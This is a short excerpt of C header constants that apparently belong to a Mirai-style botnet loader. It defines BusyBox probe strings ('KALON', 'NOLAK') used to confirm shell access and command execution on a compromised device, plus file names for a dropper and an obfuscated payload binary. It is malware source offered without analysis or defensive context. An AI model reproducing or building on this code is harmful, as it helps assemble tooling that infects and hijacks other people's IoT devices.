...
#define TOKEN_QUERY     "/bin/busybox KALON"
#define TOKEN_RESPONSE  "KALON: applet not found"

#define EXEC_QUERY     "/bin/busybox NOLAK"
#define EXEC_RESPONSE  "NOLAK: applet not found"

#define FN_DROPPER  "dropper"
#define FN_BINARY   "jnsd9sdoila"
